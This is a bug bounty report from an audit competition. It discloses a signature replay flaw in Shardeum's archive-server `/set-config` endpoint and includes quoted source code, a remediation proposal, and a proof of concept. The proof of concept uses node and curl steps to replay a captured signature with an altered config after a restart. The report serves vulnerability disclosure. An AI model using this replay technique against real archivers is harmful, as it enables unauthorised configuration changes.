# #35824 \[W\&A-Medium] \`/set-config\` replay attack is possible in production mode after archiver restar

**Submitted on Oct 9th 2024 at 20:09:56 UTC by @anton\_quantish for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35824
* **Report Type:** Websites and Applications
* **Report severity:** Medium
* **Target:** <https://github.com/shardeum/archive-server/tree/dev>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

Hey team,

## Brief/Intro

The attacker can replay the legitimate \`/set-config\` requests (even altering the config params arbitrarily) in production mode after every archiver restart.

## Vulnerability Details

Both \`GET /config\` and \`PATCH /set-config\` API handlers contain middleware where it's checked if the archiver is in the debug mode or not. If it's not then this middleware checks the request signature before passing it through: <https://github.com/shardeum/archive-server/blob/0337daa477b3a30f8fb65b87c23b021a261441bd/src/DebugMode.ts#L18-L56> \`\`\`js if (!isDebug) { try { //auth my by checking a signature if (\_req.query.sig != null && \_req.query.sig\_counter != null) { const ownerPk = getDevPublicKey() const requestSig = \_req.query.sig //check if counter is valid const sigObj = { route: \_req.routerPath, count: \_req.query.sig\_counter, sign: { owner: ownerPk, sig: requestSig }, } const currentCounter = parseInt(sigObj.count) //reguire a larger counter than before. This prevents replay attacks const currentTime = new Date().getTime() if (currentCounter > lastCounter && currentCounter <= currentTime + MAX\_COUNTER\_BUFFER\_MILLISECONDS) { const verified = Crypto.verify(sigObj) if (!verified) { throw new Error('FORBIDDEN. signature authentication is failed.') } } else { console.log( \`isDebugMiddleware: currentCounter=${currentCounter}, lastCounter=${lastCounter}, currentTime=${currentTime}\` ) throw new Error('FORBIDDEN. signature counter is failed.') } lastCounter = currentCounter //update counter so we can't use it again return \`\`\`

The signature signs an object containing two fields: the \`route\` (\`/config\` or \`set-config\`) and the \`count\` which is actually the request signing timestamp. After every successful request the \`lastCounter\` global variable is updated to the \`count\` from the request and for the further ones the \`count\` is checked to be greater than \`lastCounter\`. The comment in the code above says it's to prevent the replay-attacks.

The vulnerability here is than the initial value of the \`lastCounter\` is 0: <https://github.com/shardeum/archive-server/blob/0337daa477b3a30f8fb65b87c23b021a261441bd/src/DebugMode.ts#L5>

It means that after every archiver restart any of the previous valid requests could be replayed because all the conditions are met:

* any \`count\` despite whatever it was will be greater than \`lastCounter\` (which is 0);
* the signature is valid.

What is even worse is that the request doesn't need to be replayed exactly the same but could be altered arbitrarily. That's because of the only signed fields are counter and the route, but not the body of the request (the applying config).

In the \`/set-config\` request handler itself the \`sign\` field is extracted from the request body but then... it's not longer used: <https://github.com/shardeum/archive-server/blob/0337daa477b3a30f8fb65b87c23b021a261441bd/src/API.ts#L984-L1019> \`\`\`js server.patch( '/set-config', { preHandler: async (\_request, reply) => { isDebugMiddleware(\_request, reply) }, }, async (\_request: ConfigPatchRequest, reply) => { const RESTRICTED\_PARAMS = \[ 'ARCHIVER\_IP', 'ARCHIVER\_PORT', 'ARCHIVER\_HASH\_KEY', 'ARCHIVER\_SECRET\_KEY', 'ARCHIVER\_PUBLIC\_KEY', ] try { const { sign, ...newConfig } = \_request.body const validKeys = new Set(Object.keys(config)) const payloadKeys = Object.keys(newConfig) const invalidKeys = payloadKeys.filter( (key) => !validKeys.has(key) || RESTRICTED\_PARAMS.includes(key) )

```
    if (invalidKeys.length &gt; 0)
      throw new Error(&#x60;Invalid/Unauthorised config properties provided: ${invalidKeys.join(&#x27;, &#x27;)}&#x60;)

    if (config.VERBOSE)
      Logger.mainLogger.debug(&#x27;Archiver config update executed: &#x27;, JSON.stringify(newConfig))

    const updatedConfig &#x3D; updateConfig(newConfig)
    reply.send({ success: true, ...updatedConfig, ARCHIVER_SECRET_KEY: &#x27;&#x27; })
  } catch (error) {
    reply.status(400).send({ success: false, reason: error.message })
  }
}
```

) \`\`\`

## Impact Details

The attacker who is able to intercept just a single one \`/set-config\` valid request is then able to arbitrarily alter the archiver config after every archiver restart.

I don't understand all the attacker models well and thus I don't know how easy it's to intercept the request but I see at least that:

* the archiver server works over the plain HTTP (unencrypted);
* there's the protection from the replay attack implemented.

That's why I believe it's possible to intercept such a request and the protection implemented should work well.

I downgraded the severity to High though because there're obvious attack preconditions/limitations.

## Remediation

I believe you can init the \`lastCounter\` with the current time on the archiver start - then all the previous requests would have lower counter and wouldn't pass the check.

Also, I'd also check the configuration body signature because the endpoint would be vulnerable to MitM or race condition otherwise, when the attacker can see the legitimate request and try to send his own malicious config faster . Or maybe it can drop the original request and send his own one. Anyway, I think the signature of the config body should also be checked.

## Proof of Concept

## Proof of Concept

1. Generate the valid counter and signature with node REPL shell: \`\`\`js const crypto = require('@shardus/crypto-utils') crypto.init(YOUR\_ARCHIVER\_HASH\_KEY) obj = {route: '/set-config', count: (new Date().getTime()).toString()} crypto.signObj(obj, YOUR\_ARCHIVER\_SECRET\_KEY, YOUR\_ARCHIVER\_PUBLIC\_KEY) obj \`\`\` the result is something like \`\`\`js { route: '/set-config', count: '1728500989222', sign: { owner: '31ba246ea6baef8f86a8b6cb2b7c84b0223c5975f8c6974d74d856efe94728e1', sig: '01cdd7d7cee5b076b9716f66b3d09ebc726fec2c5bfd74437751e43d1c6f4ebef650097d6ad9f718fc7fb792f7697d8051f36d5abc0048c3bf21c30c6d972e03eb3bd6973dd7f359ea8825bdfaed6bdee66f95a906c603028c80c5fa9db006f6' } } \`\`\`
2. Send the test (legitimate) request with CURL: \`\`\`bash curl '<http://127.0.0.1:4000/set-config?sig\\_counter=1728500989222\\&sig=01cdd7d7cee5b076b9716f66b3d09ebc726fec2c5bfd74437751e43d1c6f4ebef650097d6ad9f718fc7fb792f7697d8051f36d5abc0048c3bf21c30c6d972e03eb3bd6973dd7f359ea8825bdfaed6bdee66f95a906c603028c80c5fa9db006f6>' -XPATCH -H 'Content-Type: application/json' -d '{"VERBOSE": false}' \`\`\` Make sure the response contains \`"VERBOSE": false\`
3. Send it again and make sure it's forbidden because of invalid counter.
4. Restart the network with \`shardus stop && shardus start 10\`
5. Send the request again but altered for instance \`\`\`bash curl '<http://127.0.0.1:4000/set-config?sig\\_counter=1728500989222\\&sig=01cdd7d7cee5b076b9716f66b3d09ebc726fec2c5bfd74437751e43d1c6f4ebef650097d6ad9f718fc7fb792f7697d8051f36d5abc0048c3bf21c30c6d972e03eb3bd6973dd7f359ea8825bdfaed6bdee66f95a906c603028c80c5fa9db006f6>' -XPATCH -H 'Content-Type: application/json' -d '{"VERBOSE": true}' \`\`\` Make sure the response now has the \`"VERBOSE": true\` field.
